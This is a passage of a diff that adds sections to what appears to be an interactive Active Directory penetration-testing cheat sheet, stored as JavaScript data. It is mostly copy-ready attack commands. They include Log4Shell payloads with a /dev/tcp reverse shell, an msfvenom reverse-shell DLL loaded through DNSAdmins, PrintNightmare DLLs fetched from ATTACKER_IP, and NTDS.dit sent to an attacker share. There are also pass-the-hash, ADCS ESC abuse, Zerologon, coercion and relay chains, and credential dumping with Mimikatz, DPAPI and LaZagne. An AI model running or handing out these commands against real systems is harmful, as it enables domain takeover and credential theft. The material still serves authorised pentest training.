+    c('Tomcat enum','auxiliary/scanner/http/tomcat_enum'),
+    c('Tomcat deploy exploit','exploit/multi/http/tomcat_mgr_deploy'),
+    c('Java RMI','exploit/multi/misc/java_rmi_server'),
+    c('ysoserial','java -jar ysoserial.jar CommonsCollections1 "cmd"'),
+  ]),
+  h('Log4Shell',[
+    c('Basic payload','${jndi:ldap://DC_IP:PORT/o=reference}'),
+    c('Obfuscated','${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://DC_IP:PORT/x}'),
+    c('RogueJNDI','java -jar rogueJndi-1.0.jar -n DC_IP -c "bash -i >& /dev/tcp/DC_IP/PORT 0>&1"'),
+    c('DNS check','${jndi:dns://DC_IP:PORT/test}'),
+  ]),
+  h('Low-Hanging CVEs',[
+    c('EternalBlue (MS17-010)','exploit/windows/smb/ms17_010_eternalblue'),
+    c('MS08-068 SMB relay','use exploit/windows/smb/smb_relay # Windows 2000/2008'),
+    c('GPP MS14-025','findstr /S /I cpassword \\\\domain.local\\sysvol\\domain.local\\policies\\*.xml'),
+    c('GPP metasploit','use scanner/smb/smb_enum_gpp'),
+    c('Searchsploit','searchsploit "Windows Server 2016"'),
+    c('Database creds','use admin/mssql/mssql_enum_sql_logins'),
+  ]),
+]},
+
+// ── 23. HASH CRACKING ────────────────────────────────────
+{id:'hashcrack',label:'23. Hash Cracking',color:'#ef5350',x:1220,y:2200,parent:null,items:[
+  h('LM Hashes',[
+    c('john LM','john --format=lm hash.txt'),
+    c('hashcat LM','hashcat -m 3000 -a 3 hash.txt'),
+  ]),
+  h('NTLM Hashes',[
+    c('john NTLM','john --format=nt hash.txt'),
+    c('hashcat NTLM','hashcat -m 1000 -a 3 hash.txt'),
+    c('online crack','# Try https://crackstation.net or https://crack.sh/'),
+  ]),
+  h('NetNTLMv1',[
+    c('john netntlmv1','john --format=netntlm hash.txt'),
+    c('hashcat netntlmv1','hashcat -m 5500 -a 3 hash.txt'),
+    c('crack.sh (NTLMv1)','# https://crack.sh/ - very fast for NTLMv1'),
+  ]),
+  h('NetNTLMv2',[
+    c('john netntlmv2','john --format=netntlmv2 hash.txt'),
+    c('hashcat netntlmv2','hashcat -m 5600 -a 0 hash.txt rockyou.txt'),
+    c('hashcat with rules','hashcat -m 5600 -a 0 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule'),
+  ]),
+  h('Kerberos TGS (Kerberoast)',[
+    c('hashcat TGS RC4','hashcat -m 13100 -a 0 spn.txt rockyou.txt'),
+    c('john TGS','john spn.txt --format=krb5tgs --wordlist=rockyou.txt'),
+    c('hashcat TGS AES128','hashcat -m 19600 -a 0 spn.txt rockyou.txt'),
+    c('hashcat TGS AES256','hashcat -m 19700 -a 0 spn.txt rockyou.txt'),
+  ]),
+  h('Kerberos ASREP',[
+    c('hashcat ASREP','hashcat -m 18200 -a 0 asrep.txt rockyou.txt'),
+    c('john ASREP','john asrep.txt --format=krb5asrep --wordlist=rockyou.txt'),
+  ]),
+  h('MsCache2 (DCC2)',[
+    c('hashcat DCC2 (slow)','hashcat -m 2100 -a 0 dcc2.txt rockyou.txt'),
+    c('john DCC2','john dcc2.txt --format=mscash2 --wordlist=rockyou.txt'),
+  ]),
+  h('Password Attack Tools',[
+    c('Password spray CME','cme smb DC_IP -u users.txt -p passwords.txt --no-bruteforce'),
+    c('Password spray kerbrute','kerbrute passwordspray -d domain.local --dc DC_IP users.txt "Password123!"'),
+    c('Password spray sprayhound','sprayhound -U users.txt -d domain.local -dc DC_IP'),
+    c('Get pass policy','cme smb DC_IP -u user -p pass --pass-pol'),
+    c('FGPP check','Get-ADFineGrainedPasswordPolicy -filter *'),
+  ]),
+]},
+
+// ── 24. PASS THE HASH / TICKET / KEY ─────────────────────
+{id:'pth',label:'24. PTH / PTT / PTK',color:'#ff8a65',x:1680,y:2200,parent:null,items:[
+  h('Pass the Hash (PTH)',[
+    c('psexec PTH','psexec.py -hashes ":HASH" user@DC_IP'),
+    c('atexec PTH','atexec.py -hashes ":HASH" user@DC_IP "whoami"'),
+    c('smbexec PTH','smbexec.py -hashes ":HASH" user@DC_IP'),
+    c('wmiexec PTH','wmiexec.py -hashes ":HASH" user@DC_IP'),
+    c('dcomexec PTH','dcomexec.py -hashes ":HASH" user@DC_IP'),
+    c('CME PTH','cme smb DC_IP/24 -u user -d domain.local -H ":HASH"'),
+    c('CME local PTH','cme smb DC_IP/24 -u user -H ":HASH" --local-auth'),
+    c('evil-winrm PTH','evil-winrm -i DC_IP -u user -H HASH'),
+    c('xfreerdp PTH','xfreerdp /u:user /d:domain.local /pth:HASH /v:DC_IP'),
+    c('smbclient PTH','smbclient.py -hashes ":HASH" user@DC_IP'),
+    c('reg.py PTH','reg.py domain.local/user@DC_IP -hashes ":HASH" add -keyName "HKLM\\System\\CurrentControlSet\\Control\\Lsa" -v "DisableRestrictedAdmin" -vt "REG_DWORD" -vd "0"'),
+  ]),
+  h('Overpass the Hash / PTK',[
+    c('Rubeus OPTH','Rubeus asktgt /user:victim /rc4:HASH'),
+    c('Rubeus PTT','Rubeus ptt /ticket:TICKET'),
+    c('Rubeus createnetonly','Rubeus createnetonly /program:C:\\Windows\\System32\\cmd.exe'),
+    c('getTGT impacket','getTGT.py domain.local/user -hashes :HASH'),
+    c('getTGT aeskey','getTGT.py -aesKey KEY domain.local/user@DC_IP'),
+  ]),
+  h('Pass the Ticket (PTT)',[
+    c('Export tickets','sekurlsa::tickets /export'),
+    c('Rubeus dump krbtgt','Rubeus dump /service:krbtgt /nowrap'),
+    c('Rubeus monitor','Rubeus monitor /interval:5'),
+    c('ticketConverter','ticketConverter.py ticket.kirbi ticket.ccache'),
+    c('Set KRB5CCNAME','export KRB5CCNAME=/root/ticket.ccache'),
+    c('impacket -k','secretsdump.py -k -no-pass domain.local/user@DC_IP'),
+    c('mimikatz ptc','mimikatz "kerberos::ptc ticket.ccache"'),
+    c('Rubeus ptt','Rubeus.exe ptt /ticket:ticket.kirbi'),
+    c('modify SPN','tgssub.py -in ticket.ccache -out new.ccache -altservice "cifs/target"'),
+  ]),
+  h('aesKey / Kerberos',[
+    c('secretsdump aeskey','secretsdump.py -aesKey KEY domain.local/user@DC_IP'),
+    c('DCSync with aeskey','secretsdump.py -aesKey KEY -just-dc domain.local/krbtgt@DC_IP'),
+  ]),
+  h('Cleartext / Interactive',[
+    c('psexec cleartext','psexec.py domain.local/user:pass@DC_IP'),
+    c('psexec.exe','psexec.exe -AcceptEULA \\\\DC_IP'),
+    c('evil-winrm','evil-winrm -i DC_IP -u user -p pass'),
+    c('xfreerdp cleartext','xfreerdp /u:user /d:domain.local /p:pass /v:DC_IP'),
+    c('atexec','atexec.py domain.local/user:pass@DC_IP "cmd"'),
+    c('smbexec','smbexec.py domain.local/user:pass@DC_IP'),
+    c('wmiexec','wmiexec.py domain.local/user:pass@DC_IP'),
+    c('dcomexec','dcomexec.py domain.local/user:pass@DC_IP'),
+    c('smbclient','smbclient.py domain.local/user:pass@DC_IP'),
+    c('WinRM','evil-winrm -i DC_IP -u user -p pass'),
+  ]),
+  h('SOCKS / Proxy',[
+    c('socks lookupsid','proxychains lookupsid.py domain.local/user@DC_IP -no-pass -domain-sids'),
+    c('socks mssql','proxychains mssqlclient.py -windows-auth domain.local/user@DC_IP -no-pass'),
+    c('socks secretsdump','proxychains secretsdump.py -no-pass domain.local/user@DC_IP'),
+    c('socks atexec','proxychains atexec.py -no-pass domain.local/user@DC_IP "cmd"'),
+    c('socks smbexec','proxychains smbexec.py -no-pass domain.local/user@DC_IP'),
+    c('socks smbclient','proxychains smbclient.py -no-pass user@DC_IP'),
+  ]),
+]},
+,{id:'adcs_esc',label:'25. ADCS ESC Techniques',color:'#e040fb',x:300,y:2650,parent:null,items:[
+  h('Enumeration',[
+    c('Certipy find vulnerable','certipy find -u "USER@domain.local" -p "PASS" -dc-ip DC_IP -vulnerable -enabled'),
+    c('Certify find vulnerable','Certify.exe find /vulnerable'),
+    c('Certify find /ca','Certify.exe find /ca'),
+    c('Certipy find all','certipy find -u "USER@domain.local" -p "PASS" -dc-ip DC_IP'),
+    c('BH CE ADCS data','bloodhound-ce-python --zip -c All -d domain.local -u user -p pass -dc dc01.domain.local'),
+  ]),
+  h('ESC1 — SAN Impersonation',[
+    nt('Template allows EnrolleeSuppliesSubject + Client Auth EKU'),
+    c('Request as admin','certipy req -u "user@domain.local" -p "pass" -dc-ip DC_IP -target ADCS_HOST -ca "CA-NAME" -template "VulnTemplate" -upn "administrator@domain.local"'),
+    c('Auth with cert','certipy auth -pfx administrator.pfx -dc-ip DC_IP'),
+  ]),
+  h('ESC2 — Any Purpose EKU',[
+    nt('Template has Any Purpose EKU or no EKU at all'),
+    c('Get cert','certipy req -u "user@domain.local" -p "pass" -target ADCS_HOST -template ESC2 -ca CA-NAME'),
+    c('Request on behalf of','certipy req -u "user@domain.local" -p "pass" -target ADCS_HOST -template User -ca CA-NAME -on-behalf-of "domain\\administrator" -pfx user.pfx'),
+  ]),
+  h('ESC3 — Certificate Request Agent',[
+    nt('Two templates: CRA template + vulnerable enrollment template'),
+    c('Get CRA cert','certipy req -u "user@domain.local" -p "pass" -target ADCS_HOST -template ESC3-CRA -ca CA-NAME'),
+    c('Enroll on behalf of','certipy req -u "user@domain.local" -p "pass" -target ADCS_HOST -template ESC3 -ca CA-NAME -on-behalf-of "domain\\administrator" -pfx cra.pfx'),
+  ]),
+  h('ESC4 — Vulnerable Template ACLs',[
+    nt('GenericAll/WriteDacl/WriteOwner over template object'),
+    c('Overwrite template to ESC1','certipy template -u "user@domain.local" -p "pass" -template ESC4 -write-default-configuration -dc-ip DC_IP'),
+    c('Exploit as ESC1','certipy req -u "user@domain.local" -p "pass" -dc-ip DC_IP -target ADCS_HOST -ca CA-NAME -template ESC4 -upn "administrator@domain.local"'),
+    c('Restore template','certipy template -u "user@domain.local" -p "pass" -template ESC4 -write-configuration backup.json -dc-ip DC_IP'),
+  ]),
+  h('ESC5 — Golden Certificate',[
+    nt('CA private key backup → forge any certificate'),
+    c('Backup CA','certipy ca -backup -u "Administrator" -hashes ":HASH" -ca CA-NAME -target CA_IP'),
+    c('Forge cert','certipy forge -ca-pfx CA-NAME.pfx -upn administrator@domain.local -crl "ldap:///"'),
+    c('Auth forged cert','certipy auth -pfx forged.pfx -dc-ip DC_IP'),
+  ]),
+  h('ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2',[
+    nt('CA flag allows SAN in any request (pre-May 2022 patch)'),
+    c('Exploit','certipy req -u "user@domain.local" -p "pass" -target ADCS_HOST -template User -ca CA-NAME -upn administrator@domain.local -dc-ip DC_IP'),
+    c('Check flag (certutil)','certutil -config "CA_HOST\\CA-NAME" -getreg policy\\EditFlags'),
+  ]),
+  h('ESC7 — Manage CA',[
+    nt('ManageCA right → enable SubCA template → approve own requests'),
+    c('Enable SubCA','certipy ca -u "user@domain.local" -p "pass" -target ADCS_HOST -ca CA-NAME -enable-template SubCA -dc-ip DC_IP'),
+    c('Add officer','certipy ca -u "user@domain.local" -p "pass" -target ADCS_HOST -ca CA-NAME -add-officer "user"'),
+    c('Issue request','certipy ca -u "user@domain.local" -p "pass" -target ADCS_HOST -ca CA-NAME -issue-request 58'),
+    c('Retrieve cert','certipy req -u "user@domain.local" -p "pass" -target ADCS_HOST -template SubCA -ca CA-NAME -retrieve 58'),
+  ]),
+  h('ESC8 — NTLM Relay to Web Enrollment',[
+    nt('HTTP web enrollment + coerce DC auth → relay for DC cert'),
+    c('Start relay','certipy relay -target http://ADCS_HOST -template DomainController'),
+    c('Coerce DC auth','nxc smb DC_IP -M coerce_plus -o LISTENER="ATTACKER_IP"'),
+    c('PetitPotam coerce','python3 PetitPotam.py ATTACKER_IP DC_IP'),
+    c('Auth with DC cert','certipy auth -pfx domain-controller.pfx -dc-ip DC_IP'),
+  ]),
+  h('ESC9 — No Security Extension (szOID_NTDS_CA_SECURITY_EXT)',[
+    nt('StrongCertificateBindingEnforcement=1 + CT_FLAG_NO_SECURITY_EXTENSION'),
+    c('Change UPN of controlled user','certipy account update -u "user@domain.local" -p "pass" -user target -upn administrator@domain.local'),
+    c('Request cert','certipy req -u "target@domain.local" -p "pass" -ca CA-NAME -template VulnTemplate'),
+    c('Restore UPN','certipy account update -u "user@domain.local" -p "pass" -user target -upn target@domain.local'),
+    c('Auth','certipy auth -pfx administrator.pfx -domain domain.local -dc-ip DC_IP'),
+  ]),
+  h('ESC10 — Weak Certificate Mapping',[
+    nt('Registry CertificateMappingMethods includes UPN mapping (0x4)'),
+    c('Exploit same as ESC9 flow','certipy account update + certipy req + certipy auth'),
+  ]),
+  h('ESC11 — NTLM Relay to ICPR',[
+    nt('IF_ENFORCEENCRYPTICERTREQUEST not set on RPC interface'),
+    c('Relay to RPC','certipy relay -target rpc://ADCS_HOST -ca CA-NAME'),
+    c('Coerce auth','PetitPotam.py ATTACKER_IP DC_IP'),
+  ]),
+  h('ESC13 — Issuance Policy OID Group Link',[
+    nt('OID linked to universal group → certificate grants group membership'),
+    c('Find linked groups','certipy find -u "user@domain.local" -p "pass" -dc-ip DC_IP -vulnerable'),
+  ]),
+  h('ESC14 — Weak Explicit Mappings',[
+    nt('altSecurityIdentities can be abused with write permissions'),
+  ]),
+]},
+{id:'shadow',label:'26. Shadow Credentials',color:'#7c4dff',x:760,y:2650,parent:null,items:[
+  h('Shadow Credentials Attack',[
+    nt('Write msDS-KeyCredentialLink on target → PKINIT auth'),
+    c('Add shadow cred (pywhisker)','python3 pywhisker.py -d domain.local -u "user" -p "pass" --target "victim" --action "add" --dc-ip DC_IP'),
+    c('Auth with shadow cred','python3 pywhisker.py -d domain.local -u "user" -p "pass" --target "victim" --action "list" --dc-ip DC_IP'),
+    c('Whisker (C#)','Whisker.exe add /target:victim /domain:domain.local /dc:DC_IP'),
+    c('PKINIT with cert','certipy auth -pfx victim.pfx -dc-ip DC_IP'),
+    c('Cleanup','python3 pywhisker.py -d domain.local -u "user" -p "pass" --target "victim" --action "remove" --dc-ip DC_IP -D DEVICE_ID'),
+  ]),
+  h('Pre-requisites',[
+    nt('Requires GenericWrite or GenericAll on target object'),
+    nt('Domain functional level must be 2016+'),
+    nt('At least one DC must have its own certificate for PKINIT'),
+  ]),
+  h('Detection & Indicators',[
+    nt('Event 5136 — msDS-KeyCredentialLink modification'),
+    nt('Event 4768 — PKINIT pre-auth with certificate'),
+  ]),
+]},
+{id:'mssql',label:'27. MSSQL Abuse',color:'#ff6e40',x:1220,y:2650,parent:null,items:[
+  h('Discovery',[
+    c('SPN scan for MSSQL','setspn -T domain.local -Q MSSQLSvc/*'),
+    c('PowerUpSQL discover','Get-SQLInstanceDomain'),
+    c('nmap MSSQL','nmap -sV -p 1433 --script ms-sql-info DC_IP'),
+    c('CME MSSQL auth','cme mssql DC_IP -u user -p pass'),
+  ]),
+  h('Authentication & Enumeration',[
+    c('Connect with impacket','mssqlclient.py domain.local/user:pass@DC_IP -windows-auth'),
+    c('Connect with sqsh','sqsh -S DC_IP -U domain\\user -P pass'),
+    c('List databases','SELECT name FROM master.dbo.sysdatabases;'),
+    c('Current user','SELECT SYSTEM_USER; SELECT IS_SRVROLEMEMBER("sysadmin");'),
+    c('Linked servers','EXEC sp_linkedservers; SELECT * FROM openquery("LINKED_SRV", "SELECT 1");'),
+  ]),
+  h('Command Execution',[
+    c('Enable xp_cmdshell','EXEC sp_configure \'show advanced options\',1; RECONFIGURE; EXEC sp_configure \'xp_cmdshell\',1; RECONFIGURE;'),
+    c('Execute OS command','EXEC xp_cmdshell "whoami";'),
+    c('Via linked server',"EXEC (\"EXEC sp_configure \'show advanced options\',1; RECONFIGURE;\") AT [LINKED_SRV];"),
+    c('xp_cmdshell via link',"EXEC (\"EXEC xp_cmdshell \'whoami\';\") AT [LINKED_SRV];"),
+  ]),
+  h('Privilege Escalation',[
+    c('Impersonate user','EXECUTE AS LOGIN = "sa"; EXEC xp_cmdshell "whoami";'),
+    c('PowerUpSQL impersonation','Invoke-SQLAuditPrivImpersonateLogin -Instance DC_IP -Exploit'),
+    c('UNC path injection','EXEC xp_dirtree "\\\\ATTACKER_IP\\share";'),
+    nt('Capture hash with Responder + relay or crack'),
+  ]),
+  h('Link Crawling',[
+    c('PowerUpSQL crawl','Get-SQLServerLinkCrawl -Instance DC_IP -Query "EXEC xp_cmdshell \'whoami\'"'),
+    c('Manual double link','SELECT * FROM openquery("SRV1", \'SELECT * FROM openquery("SRV2", \'\'SELECT @@version\'\')\')'),
+  ]),
+]},
+{id:'exchange',label:'28. Exchange Abuse',color:'#ff5252',x:1680,y:2650,parent:null,items:[
+  h('Exchange Enumeration',[
+    c('Find exchange servers','Get-ADComputer -Filter "servicePrincipalName -like \'*exchange*\'" -Properties servicePrincipalName'),
+    c('OWA discovery','nmap -p 443 --script http-title EXCHANGE_IP'),
+    c('ruler discover','ruler --domain domain.local discover'),
+    nt('Check /owa, /ecp, /autodiscover, /mapi, /ews endpoints'),
+  ]),
+  h('PrivExchange',[
+    nt('Exchange has WriteDACL on domain by default (pre-2019 patch)'),
+    c('Run PrivExchange','python3 privexchange.py -ah ATTACKER_IP EXCHANGE_IP -u user -p pass -d domain.local'),
+    c('Relay to LDAP','ntlmrelayx.py -t ldap://DC_IP --escalate-user user'),
+    c('DCSync after relay','secretsdump.py domain.local/user:pass@DC_IP -just-dc'),
+  ]),
+  h('CVE-2020-0688 (RCE)',[
+    c('Exploit','python3 CVE-2020-0688.py -s https://EXCHANGE_IP/owa -u user -p pass -c "cmd /c whoami"'),
+    nt('Requires valid credentials + default machineKey in web.config'),
+  ]),
+  h('ProxyLogon (CVE-2021-26855)',[
+    c('Check vulnerable','python3 proxylogon.py EXCHANGE_IP --check'),
+    c('Exploit chain','python3 proxylogon.py EXCHANGE_IP --exploit'),
+    nt('SSRF → arbitrary file write → webshell'),
+  ]),
+  h('ProxyShell (CVE-2021-34473)',[
+    c('Discovery','curl -k https://EXCHANGE_IP/autodiscover/autodiscover.json?@evil.com/mapi/nspi/?&Email=autodiscover/autodiscover.json%3f@evil.com'),
+    nt('Chained: SSRF + privilege escalation + RCE'),
+  ]),
+]},
+{id:'coerce',label:'29. Coercion Attacks',color:'#ffab00',x:300,y:3100,parent:null,items:[
+  h('PetitPotam (MS-EFSR)',[
+    c('Unauthenticated','python3 PetitPotam.py ATTACKER_IP DC_IP'),
+    c('Authenticated','python3 PetitPotam.py -u user -p pass -d domain.local ATTACKER_IP DC_IP'),
+    c('nxc coerce module','nxc smb DC_IP -u user -p pass -M coerce_plus -o LISTENER=ATTACKER_IP'),
+  ]),
+  h('PrinterBug / SpoolSample',[
+    c('SpoolSample','SpoolSample.exe DC_IP ATTACKER_IP'),
+    c('printerbug.py','python3 printerbug.py domain.local/user:pass@DC_IP ATTACKER_IP'),
+    c('dementor.py','python3 dementor.py -d domain.local -u user -p pass ATTACKER_IP DC_IP'),
+  ]),
+  h('DFSCoerce (MS-DFSNM)',[
+    c('DFSCoerce','python3 DFSCoerce.py -d domain.local -u user -p pass ATTACKER_IP DC_IP'),
+  ]),
+  h('ShadowCoerce (MS-FSRVP)',[
+    c('ShadowCoerce','python3 ShadowCoerce.py -d domain.local -u user -p pass ATTACKER_IP DC_IP'),
+  ]),
+  h('Coercer (all-in-one)',[
+    c('Scan all methods','python3 Coercer.py scan -t DC_IP -u user -p pass -d domain.local'),
+    c('Coerce via all','python3 Coercer.py coerce -t DC_IP -l ATTACKER_IP -u user -p pass -d domain.local'),
+  ]),
+  h('Relay after coercion',[
+    c('Relay to LDAP','ntlmrelayx.py -t ldap://DC_IP --delegate-access'),
+    c('Relay to ADCS','ntlmrelayx.py -t http://ADCS_IP/certsrv/certfnsh.asp -smb2support --adcs --template DomainController'),
+    c('Relay to SMB','ntlmrelayx.py -t DC_IP -smb2support'),
+  ]),
+]},
+{id:'zerologon',label:'30. Critical CVEs',color:'#f44336',x:760,y:3100,parent:null,items:[
+  h('Zerologon (CVE-2020-1472)',[
+    c('Check vulnerable','python3 zerologon_tester.py DC_NAME DC_IP'),
+    c('Exploit (set empty pw)','python3 cve-2020-1472-exploit.py DC_NAME DC_IP'),
+    c('DCSync after','secretsdump.py -no-pass -just-dc domain.local/DC_NAME\\$@DC_IP'),
+    c('Restore password','python3 restorepassword.py domain.local/DC_NAME@DC_NAME -target-ip DC_IP -hexpass HEX_HASH'),
+    nt('CRITICAL: Always restore the DC machine password after exploit!'),
+  ]),
+  h('PrintNightmare (CVE-2021-34527)',[
+    c('Check vulnerable','rpcdump.py DC_IP | grep MS-RPRN'),
+    c('Exploit (impacket)','python3 CVE-2021-1675.py domain.local/user:pass@DC_IP "\\\\ATTACKER_IP\\share\\evil.dll"'),
+    c('SharpPrintNightmare','SharpPrintNightmare.exe "\\\\ATTACKER_IP\\share\\evil.dll" "\\\\DC_IP"'),
+  ]),
+  h('sAMAccountName Spoofing (noPac)',[
+    c('Scan','python3 noPac.py domain.local/user:pass -dc-ip DC_IP --scan'),
+    c('Exploit + shell','python3 noPac.py domain.local/user:pass -dc-ip DC_IP -shell'),
+    c('sam-the-admin','python3 sam_the_admin.py domain.local/user:pass -dc-ip DC_IP -shell'),
+    nt('CVE-2021-42278 + CVE-2021-42287 chained'),
+  ]),
+  h('EternalBlue (MS17-010)',[
+    c('nmap check','nmap -p 445 --script smb-vuln-ms17-010 DC_IP'),
+    c('MSF exploit','use exploit/windows/smb/ms17_010_eternalblue'),
+  ]),
+  h('GPP Passwords (MS14-025)',[
+    c('Get-GPPPassword','Get-GPPPassword'),
+    c('gpp-decrypt','gpp-decrypt ENCRYPTED_CPASSWORD'),
+    c('CME gpp_password','cme smb DC_IP -u user -p pass -M gpp_password'),
+    c('msf module','use auxiliary/scanner/smb/smb_ms17_010'),
+  ]),
+]},
+{id:'laps_gmsa',label:'31. LAPS & gMSA',color:'#26c6da',x:1220,y:3100,parent:null,items:[
+  h('LAPS Enumeration',[
+    c('Check LAPS installed','Get-ChildItem "C:\\Program Files\\LAPS\\CSE"'),
+    c('Find LAPS computers','Get-ADComputer -Filter "ms-mcs-AdmPwd -like \'*\'" -Properties ms-mcs-AdmPwd,ms-mcs-AdmPwdExpirationTime'),
+    c('Get LAPS password','Get-ADComputer -Identity TARGET -Properties ms-mcs-AdmPwd | Select ms-mcs-AdmPwd'),
+    c('LAPSToolkit','Find-LAPSDelegatedGroups; Find-AdmPwdExtendedRights; Get-LAPSComputers'),
+    c('CME LAPS','cme smb DC_IP -u user -p pass --laps'),
+    c('pyLAPS','python3 pyLAPS.py --action get -d domain.local -u user -p pass --dc-ip DC_IP'),
+    c('LAPSDumper','python3 laps.py -u user -p pass -d domain.local'),
+  ]),
+  h('LAPS v2 (Windows LAPS)',[
+    c('Read msLAPS-Password','Get-ADComputer -Filter * -Properties msLAPS-Password,msLAPS-EncryptedPassword'),
+    nt('v2 supports encryption + password history + DSRM password backup'),
+  ]),
+  h('gMSA Password Dump',[
+    c('Read msDS-ManagedPassword','Get-ADServiceAccount -Identity svc_account -Properties msDS-ManagedPassword'),
+    c('gMSADumper','python3 gMSADumper.py -u user -p pass -d domain.local -l DC_IP'),
+    c('nxc gMSA','nxc ldap DC_IP -u user -p pass --gmsa'),
+    nt('Need read rights on msDS-ManagedPassword attribute'),
+    nt('Password is auto-rotated every 30 days by default'),
+  ]),
+  h('LAPS Persistence',[
+    c('Set LAPS expiry far future','Set-DomainObject -Identity TARGET$ -Set @{"ms-mcs-AdmPwdExpirationTime"="9999999999999999"} -Verbose'),
+    nt('Prevents automatic LAPS password rotation'),
+  ]),
+]},
+{id:'backupops',label:'32. Backup Operators',color:'#ffd54f',x:1680,y:3100,parent:null,items:[
+  h('Backup Operators Abuse',[
+    nt('Members can backup any file including NTDS.dit'),
+    c('Diskshadow script','diskshadow /s shadow.txt'),
+    nt('shadow.txt: set context persistent nowriters; add volume c: alias abc; create; expose %abc% z:;'),
+    c('Copy NTDS.dit','robocopy /B z:\\windows\\ntds . ntds.dit'),
+    c('Dump SYSTEM hive','reg save HKLM\\SYSTEM system.hive'),
+    c('Extract secrets','secretsdump.py -ntds ntds.dit -system system.hive LOCAL'),
+  ]),
+  h('SeBackupPrivilege',[
+    c('Import DLLs','Import-Module .\\SeBackupPrivilegeUtils.dll; Import-Module .\\SeBackupPrivilegeCmdLets.dll'),
+    c('Copy-FileSeBackupPrivilege','Copy-FileSeBackupPrivilege z:\\windows\\ntds\\ntds.dit C:\\temp\\ntds.dit -Overwrite'),
+  ]),
+  h('Remote NTDS via wbadmin',[
+    c('Create backup','wbadmin start backup -backuptarget:\\\\ATTACKER\\share -include:c: -quiet'),
+    c('Get versions','wbadmin get versions'),
+    c('Recover NTDS','wbadmin start recovery -version:XX/XX/XXXX-XX:XX -itemtype:file -items:c:\\windows\\ntds\\ntds.dit -recoverytarget:c:\\temp -notrestoreacl -quiet'),
+  ]),
+]},
+{id:'dnsadmin',label:'33. DNSAdmins & DPAPI',color:'#ab47bc',x:300,y:3550,parent:null,items:[
+  h('DNSAdmins Abuse',[
+    nt('DNSAdmins group → load arbitrary DLL into DNS service (SYSTEM)'),
+    c('Create malicious DLL','msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f dll > evil.dll'),
+    c('Set serverlevelplugindll','dnscmd DC_IP /config /serverlevelplugindll \\\\ATTACKER_IP\\share\\evil.dll'),
+    c('Restart DNS','sc \\\\DC_IP stop dns; sc \\\\DC_IP start dns'),
+    c('CME module','cme smb DC_IP -u user -p pass -M dnsadmins'),
+  ]),
+  h('DPAPI Credential Extraction',[
+    c('Mimikatz vault creds','vault::cred'),
+    c('List vaults','vaultcmd /listcreds:"Windows Credentials" /all'),
+    c('DPAPI master keys','sekurlsa::dpapi'),
+    c('Decrypt with masterkey','dpapi::cred /in:C:\\Users\\user\\AppData\\...\\credentials\\GUID /masterkey:KEY'),
+    c('Domain DPAPI backup key','lsadump::backupkeys /system:DC_IP /export'),
+    c('SharpDPAPI','SharpDPAPI.exe credentials /server:DC_IP'),
+    c('DonPAPI','python3 DonPAPI.py domain.local/user:pass@DC_IP'),
+  ]),
+  h('Browser & Application Creds',[
+    c('SharpChromium','SharpChromium.exe logins'),
+    c('LaZagne','lazagne.exe all'),
+    c('SessionGopher','Invoke-SessionGopher -Thorough'),
+    c('Seatbelt browser','Seatbelt.exe -group=user -outputfile=output.txt'),
+  ]),
+]},
+{id:'delegation',label:'34. Delegation Deep Dive',color:'#00e676',x:760,y:3550,parent:null,items:[
+  h('Unconstrained Delegation',[
+    nt('TrustedForDelegation flag → stores TGTs of all authenticating users'),
+    c('Find unconstrained','Get-ADComputer -Filter {TrustedForDelegation -eq $True}'),
+    c('PowerView','Get-DomainComputer -Unconstrained'),
+    c('Rubeus monitor','Rubeus.exe monitor /interval:5'),
+    c('Coerce DC auth','SpoolSample.exe DC_FQDN UNCONSTRAINED_HOST'),
+    c('Rubeus dump TGT','Rubeus.exe dump /service:krbtgt'),
+    c('PTT with TGT','Rubeus.exe ptt /ticket:BASE64_TICKET'),
+  ]),
+  h('Constrained Delegation',[
+    nt('msDS-AllowedToDelegateTo → impersonate any user to specific services'),
+    c('Find constrained','Get-ADComputer -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo'),
+    c('S4U (Rubeus)','Rubeus.exe s4u /user:SVC$ /rc4:HASH /impersonateuser:administrator /msdsspn:cifs/TARGET /ptt'),
+    c('S4U (impacket)','getST.py -spn cifs/TARGET -impersonate administrator domain.local/SVC$ -hashes :HASH'),
+    c('Alt service abuse','Rubeus.exe s4u /user:SVC$ /rc4:HASH /impersonateuser:administrator /msdsspn:time/TARGET /altservice:cifs,ldap,http /ptt'),
+    nt('Alternative services: CIFS, HTTP, HOST, LDAP, MSSQL, WSMAN, RPCSS'),
+  ]),
+  h('Resource-Based Constrained Delegation (RBCD)',[
+    nt('Write msDS-AllowedToActOnBehalfOfOtherIdentity on target'),
+    c('Create machine account','addcomputer.py -computer-name FAKE01$ -computer-pass P@ss123 -dc-ip DC_IP domain.local/user:pass'),
+    c('Powermad add','New-MachineAccount -MachineAccount FAKE01 -Password $(ConvertTo-SecureString "P@ss123" -AsPlainText -Force)'),
+    c('Set RBCD (impacket)','rbcd.py -delegate-from FAKE01$ -delegate-to TARGET$ -dc-ip DC_IP -action write domain.local/user:pass'),
+    c('S4U to target','getST.py -spn cifs/TARGET.domain.local -impersonate administrator -dc-ip DC_IP domain.local/FAKE01$:P@ss123'),
+    c('Use ticket','export KRB5CCNAME=administrator.ccache; psexec.py -k -no-pass domain.local/administrator@TARGET.domain.local'),
+    c('Cleanup RBCD','rbcd.py -delegate-from FAKE01$ -delegate-to TARGET$ -dc-ip DC_IP -action flush domain.local/user:pass'),
+  ]),
+  h('Protocol Transition',[
+    nt('TRUSTED_TO_AUTH_FOR_DELEGATION flag enables S4U2Self'),
+    nt('Without it, S4U2Self returns non-forwardable ticket'),
+    nt('RBCD bypasses forwardable check → works without protocol transition'),
+  ]),
+]},
+{id:'bloodhound2',label:'35. BloodHound Advanced',color:'#82b1ff',x:1220,y:3550,parent:null,items:[
+  h('Data Collection',[
+    c('SharpHound (all)','SharpHound.exe --CollectionMethods All --Domain domain.local --ExcludeDCs'),
+    c('SharpHound (session)','SharpHound.exe --CollectionMethods Session --Loop --LoopDuration 02:00:00'),
+    c('BH Python','bloodhound-python -c All -d domain.local -u user -p pass -dc DC_IP -ns DC_IP'),
+    c('BH CE Python','bloodhound-ce-python --zip -c All -d domain.local -u user -p pass -dc DC_FQDN -ns DC_IP'),
+    c('RustHound','rusthound -d domain.local -u user -p pass -i DC_IP --zip'),
+  ]),
+  h('Key Cypher Queries',[
